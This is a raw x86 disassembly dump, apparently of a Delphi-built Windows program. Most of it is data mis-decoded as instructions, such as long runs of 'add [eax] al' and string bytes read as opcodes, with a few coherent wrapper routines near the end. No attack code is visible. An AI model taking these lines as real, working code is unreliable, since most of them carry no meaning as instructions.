add [ edi + 0x3e340041 ] ah
inc ecx
add [ esi + edi ] bh
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ edx ] al
add bh bh
add [ eax ] al
add [ eax - 0x77ffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] dh
inc ecx
add ah dl
aaa
inc ecx
add [ ecx + edi + 0x36840041 ] bh
inc ecx
add [ eax ] al
aaa
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x10004114 ]
jne r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] cl
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
sbb [ ebx ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
adc eax [ ecx ]
or al 0x0
add [ eax ] al
or al 0x6e
inc eax
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] dl
inc ebp
push ebx
je r-xdata
add [ edx + esi ] cl
inc eax
add [ eax + 0x13 ] bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x13 ] bh
inc ecx
add [ eax + eax ] cl
add [ eax ] al
or al 0x6e
inc eax
add [ eax - 0x6bffbfcc ] cl
add [ eax ] al
pop esp
adc [ ecx ] al
mov [ eax + eax * 2 ] dh
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x11 ] bl
inc ecx
add [ eax + eax ] cl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi ] cl
inc ebp
inc ebx
insb
popad
jae r-xdata
adc [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x11
inc ecx
add [ eax + eax ] cl
add [ eax ] al
pop esp
adc [ ecx ] al
mov [ eax + eax * 2 ] dh
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
inc ecx
add [ 0x73694c54 ] al
je r-xdata
add [ esi + esi + 0x37000041 ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x1490c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004114 ] ah
arpl [ ebp + 0x73 ] sp
xor [ ecx + eax * 2 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
adc al 0x41
add [ eax + eax ] cl
add [ eax ] al
or al 0x6e
inc eax
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
xor [ eax ] eax
adc [ eax + eax * 2 + 0x40324800 ] dh
add [ edi ] cl
inc ebp
dec edi
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ecx + eax * 2 ] dl
outsd
jb r-xdata
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edi ] cl
inc ebp
inc ebx
outsd
insd
jo r-xdata
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x13
inc ecx
add [ eax ] dl
add [ eax ] al
add al dl
outsb
inc eax
sub_411615
int1
adc eax 0x15ff0041
inc ecx
add [ ecx ] cl
push ss
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
adc eax 0x8004116
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x16900040 ] cl
inc ecx
add [ ecx ] ah
push ss
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffbeea ] ah
push ss
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xc004116 ] dh
add [ eax ] al
add [ ebp + edx + 0x41 ] dl
add [ eax - 0xbffbfcc ] cl
inc ecx
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ edi + 0x3e340041 ] ah
inc ecx
add [ esi + edi ] bh
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ edi + edi + 0xe0041 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
adc al 0x11
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
sbb dl 0x7
inc ebx
insb
popad
jae r-xdata
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add ah ch
dec ecx
inc ecx
add [ eax ] ah
dec edx
inc ecx
add [ eax + 0x1000414b ] cl
dec esp
inc ecx
add al dl
dec esp
inc ecx
add [ eax + 0x4d ] bl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebx + 0x74 ] 0xcc746e65
push ss
inc ecx
add [ edi ] al
adc eax 0x746e4954
jb r-xdata
add [ eax ] al
add [ ecx + ebx + 0x41 ] al
add [ eax ] dh
add [ eax ] al
add [ eax ] dh
pop ss
outsb
jae r-xdata
dec [ ebx + 0x41177cc0 ]
add [ eax ] al
add bh bh
add ah bh
pop ss
inc ecx
add [ eax + ebx ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] cl
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add [ edx + esi ] cl
imul ebp [ esi + 0x67 ] 0x7473694c
push esp
sbb [ ecx ] eax
pop es
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc ecx
add [ eax + eax * 2 + 0x41 ] ah
add [ eax - 0x53ffbec0 ] cl
inc eax
inc ecx
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ eax ] cl
inc esp
inc ecx
add ah bh
inc esp
inc ecx
add [ eax + 0x46 ] bh
inc ecx
add [ edi + eax * 2 ] al
inc ecx
add al bl
inc edi
inc ecx
add [ edx + ebp + 0x480c0040 ] cl
inc ecx
add [ eax + ecx * 2 ] bh
inc ecx
add [ eax + 0x3c004148 ] dl
dec ecx
inc ecx
add ah dl
dec edx
inc ecx
add [ ebx + ecx * 2 ] ch
inc ecx
add al al
dec ebx
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bh
push ss
inc ecx
add [ eax + eax ] cl
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
adc [ ecx + eax * 2 ] cl
ror [ ecx + eax * 2 ] 0x1
pop eax
dec ebp
sbb al 0x18
inc ecx
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
sbb [ ecx ] al
adc [ eax ] al
add [ eax ] al
push esp
adc eax 0x34880041
inc eax
add [ esp + esi + 0x34980040 ] dl
push cs
imul esi [ ebx + 0x74 ] 0x90746e65
push ss
inc ecx
add al cl
adc eax 0x41
pop es
inc ebx
insb
popad
jae r-xdata
push ebx
je r-xdata
popad
add [ esp + edx * 2 + 0x2a8c0041 ] al
inc eax
add [ edx + ebp + 0x55240040 ] cl
inc ecx
add [ eax + 0x7004155 ] ch
push esp
push ebx
je r-xdata
and [ ecx + eax * 2 ] dl
insb
push esp
inc ecx
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sbb [ eax ] bl
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
xor [ eax ] eax
or al 0x32
mov [ eax + eax * 2 ] dh
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
outsb
jae r-xdata
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + eax * 2 ] dh
inc ecx
add [ esi + edi ] dh
inc ecx
add [ edx + eax * 2 + 0x41 ] ch
add [ ecx + eax * 2 + 0x41 ] ah
add [ edx + ebp + 0x44f00040 ] cl
inc ecx
add [ edx + ebp + 0x44f80040 ] cl
inc ecx
add [ eax + 0x45 ] dl
inc ecx
jae r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
lodsb [ esi ]
sbb al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x411a 0x0
or [ eax ] al
add [ eax ] al
call 0xffffffff88415ba6
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] bh
pop edx
inc ecx
add [ eax ] ah
push esp
inc ecx
add [ eax + ebx * 2 + 0x41 ] ah
add [ eax + 0x58 ] bh
inc ecx
add [ eax ] bl
pop eax
inc ecx
add [ eax ] ch
pop eax
inc ecx
add [ edx * 2 + 0x58380041 ] ah
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
jb r-xdata
jae r-xdata
inc eax
add [ eax + 0x3400414d ] bl
inc ecx
add [ edx + esi ] cl
pop ss
inc ecx
add al cl
adc eax 0x41
pop es
inc ebx
insb
popad
jae r-xdata
add [ eax + r-xdata ] dl
insd
dec ebp
insd
outsd
jb r-xdata
insd
and [ ebx ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx ] bh
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x19 ] bh
inc ecx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] ah
push esp
inc ecx
add [ esp + edx * 2 + 0x41 ] ch
add [ esp + edx * 2 + 0x5a740041 ] al
inc ecx
add [ edx + ebp + 0x5aac0040 ] cl
inc ecx
add [ eax + 0x13004155 ] ch
push esp
inc ebx
jne r-xdata
popad
test al 0x55
je r-xdata
inc ecx
add [ 0x6e614854 ] cl
insb
add [ eax ] bh
pop eax
insd
xor al 0x1a
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1a ] dl
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x19 ] bh
inc ecx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] ah
push esp
inc ecx
add [ eax + ebx * 2 + 0x41 ] ah
add [ eax + 0x58 ] bh
inc ecx
add [ eax ] bl
pop eax
inc ecx
add [ eax ] ch
pop eax
inc ecx
add [ edx * 2 + 0x58380041 ] ah
popad
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] ah
push esp
inc ecx
add [ esp + edx * 2 + 0x41 ] ch
add [ ebp + 0x19c40040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
sbb [ ecx ] eax
add al 0x0
add [ eax ] al
mov al [ 0xffffffff88004010 ]
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
add [ edx + eax * 2 + 0x41 ] ch
dec ebp
inc ecx
add [ esi + edi ] dh
inc ecx
jae r-xdata
jns r-xdata
push ebx
je r-xdata
push ebx
push ebx
outsd
jb r-xdata
inc ecx
add [ eax - 0x5fffbeab ] ch
pop ebx
inc ecx
add [ 0x6d654d54 ] cl
add [ ebx + 0x411840c0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
and [ ecx + eax * 2 ] dl
insb
push esp
inc ecx
je r-xdata
insd
inc ecx
add [ eax + 0xd00415b ] ah
push esp
dec ebp
popad
insd
pushfd
sbb eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x1400411b
add [ eax ] al
add ah dl
sbb al [ ecx ]
mov [ eax + eax * 2 ] dh
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add al dl
pop edx
inc ecx
add [ eax ] ah
push esp
inc ecx
add [ ebx + ebx * 2 + 0x41 ] dh
add [ esp + edx * 2 + 0x5a740041 ] al
inc ecx
add [ esp + ebx * 2 ] ch
inc ecx
add [ edx + ebx * 2 + 0x55a80041 ] ch
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
add [ esp + edx * 2 + 0x5a740041 ] al
inc ecx
add al ch
pop ebp
inc ecx
add [ edx + ebx * 2 + 0x55a80041 ] ch
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
popad
insd
mov eax eax
sbb [ ecx + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx ] dh
inc ecx
add [ eax ] bl
add [ eax ] al
add ah dl
sbb al [ ecx ]
mov [ eax + eax * 2 ] dh
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x2000415d ] dh
push esp
inc ecx
add [ esp + edx * 2 + 0x41 ] ch
add [ ecx + eax * 2 + 0x41 ] ah
add [ eax + 0x50 ] al
inc ecx
add [ eax + edx * 2 + 0x41 ] dh
add [ eax + 0x50 ] bh
inc ecx
add [ eax + edx * 2 + 0x41 ] bh
add [ eax + 0x45 ] dl
inc ecx
add al dh
push ecx
inc ecx
add [ edx + edx * 2 + 0x41 ] cl
add [ eax ] ah
push ebx
inc ecx
add [ eax ] dl
dec esp
inc ecx
add [ ebx + edx * 2 + 0x41 ] bl
add al dl
push ebx
inc ecx
add ah dh
dec ebp
inc ecx
add [ eax ] al
dec esi
inc ecx
add [ eax + eax * 2 + 0x4e9c0041 ] ch
inc ecx
add ah bl
dec esi
inc ecx
add [ eax + 0x4f ] cl
inc ecx
add ah bh
inc esp
inc ecx
add al bl
push eax
inc ecx
add [ edi + eax * 2 ] al
inc ecx
add al bl
inc edi
inc ecx
add [ ecx + edx * 2 ] dl
inc ecx
add [ ecx + edx * 2 ] ah
inc ecx
add [ eax + ecx * 2 ] bh
inc ecx
add [ eax + 0x3c004148 ] dl
dec ecx
inc ecx
add ah dl
dec edx
inc ecx
add [ ebx + ecx * 2 ] ch
inc ecx
add al al
dec ebx
inc ecx
add [ esi + ecx * 2 + 0x41 ] ah
add [ eax + 0x7800414e ] al
push ecx
inc ecx
add al cl
dec edi
inc ecx
add [ eax - 0x67ffbead ] cl
push ebx
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
insb
outsb
dec ecx
je r-xdata
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
inc edx
inc ecx
inc ecx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
lodsb [ esi ]
sbb [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
sbb [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sbb [ ecx ] eax
xor [ eax ] al
add [ eax ] al
xor [ edi ] dl
sub_411b7b
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add al dl
pop edx
inc ecx
add [ eax ] ah
push esp
inc ecx
add [ ebx + ebx * 2 + 0x41 ] dh
add [ esp + edx * 2 + 0x5a740041 ] al
inc ecx
add [ esp + ebx * 2 ] ch
inc ecx
add [ edx + ebx * 2 + 0x55a80041 ] ch
inc ecx
add [ eax + 0xd00415b ] ah
push esp
dec ebp
insd
outsd
jb r-xdata
push ebx
push ebx
je r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
popad
insd
mov eax eax
sbb [ ecx + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx ] dh
inc ecx
add [ eax ] bl
add [ eax ] al
add ah dl
sbb al [ ecx ]
mov [ eax + eax * 2 ] dh
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x2000415d ] dh
push esp
inc ecx
add [ esp + edx * 2 + 0x41 ] ch
add [ esp + edx * 2 + 0x5a740041 ] al
inc ecx
add al ch
pop ebp
inc ecx
add [ edx + ebx * 2 + 0x55a80041 ] ch
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
sub_41207c
cmp ah [ eax ]
inc ecx
add [ eax ] al
add [ eax ] al
add ah dh
and [ ecx ] al
js r-xdata
add [ eax ] dl
xchg edx eax
inc ecx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x34004191 ] bl
inc ecx
add ah al
xchg esp eax
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ ebp + edx * 4 - 0x6b97ffbf ] bl
inc ecx
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc ecx
add [ ecx + edx * 4 + 0x41 ] cl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi + ebx + 0x80041 ] al
add [ eax ] al
adc [ eax ] al
std
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
and [ ecx ] eax
push 0x30004121
add [ eax ] al
add [ ebp + edx + 0x41 ] dl
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
sub_412123
push ecx
push eax
call [ eax - 0x6b ]
inc ecx
add [ eax - 0x6b ] bl
inc ecx
add [ ebp + edx * 4 + 0x41 ] bl
add [ ebp + edx * 4 + 0x41 ] dh
add [ eax + 0x78004195 ] ch
xchg ebp eax
inc ecx
add [ eax - 0x7bffbe6b ] al
xchg ebp eax
inc ecx
add [ eax + 0x3c004195 ] dl
xchg esi eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and al [ ecx ]
adc al 0x0
outsb
outsb
je r-xdata
add [ ebx + ebx * 4 ] cl
inc ecx
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
arpl [ ecx + 0x63 ] ax
je r-xdata
add [ eax ] al
adc [ eax ] al
std
js r-xdata
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc ecx
add [ eax - 0x66 ] ch
inc ecx
add ah cl
fwait
inc ecx
add [ eax - 0x65 ] dh
inc ecx
add [ ebx + ebx * 4 ] al
inc ecx
add [ ebx + ebx * 4 ] dh
inc ecx
add [ eax ] cl
fwait
inc ecx
add [ ebx + ebx * 4 + 0x41 ] dl
add [ ecx ] al
add bh ch
lodsb [ esi ]
xchg ebp eax
inc ecx
add [ esi + edx * 4 - 0x6717ffbf ] ah
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xa400408d
and al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebx ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
and al [ ecx ]
hlt
add [ eax ] al
mov al [ 0xffffffff88004010 ]
xor al 0x40
add [ edi + ebx + 0x80041 ] al
add bh bh
sbb [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x4e
inc ecx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x41 ] al
add [ eax + eax ] dl
outsb
outsb
je r-xdata
inc ecx
add [ eax - 0x6a ] dl
inc ecx
add [ eax + ebx * 4 + 0x41 ] ch
add [ ebp + edx * 4 + 0x41 ] bh
add [ eax - 0x6b ] ah
inc ecx
add [ ebp + edx * 4 + 0x41 ] cl
add [ eax + ebx * 4 + 0x540a0041 ] dl
inc ebx
outsd
insd
jo r-xdata
xchg ebp eax
inc ecx
add [ esi + edx * 4 ] bh
and [ ecx ] al
enter 0x4115 0x0
add al [ eax ]
pop es
inc ebx
insb
popad
jae r-xdata
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ ecx + ebx * 4 - 0x6647ffbf ] bh
inc ecx
add al dh
cdq
inc ecx
add [ eax - 0x66 ] dl
inc ecx
add [ edx + ebx * 4 ] ah
inc ecx
add [ edx + ebx * 4 + 0x41 ] dl
add [ ecx + ebx * 4 + 0x41 ] dh
add [ eax ] cl
0x9a5c0041 0x41
adc [ edx + eax * 2 + 0x61 ] dl
jae r-xdata
jae r-xdata
popad
insd
cmp al 0x10
inc eax
add [ eax + eax ] cl
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
and al 0x22
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ds
inc ecx
add [ eax ] cl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
sub_412350
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405de0
pop edi
pop esi
pop ebx
retn
sub_412378
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405dc4
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4123a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405de8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412498
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4137ac
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_40346c
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_40346c
test al al
je r-xdata
sub_4124f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_412498
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_412498
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_40346c
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_412568
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403228
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
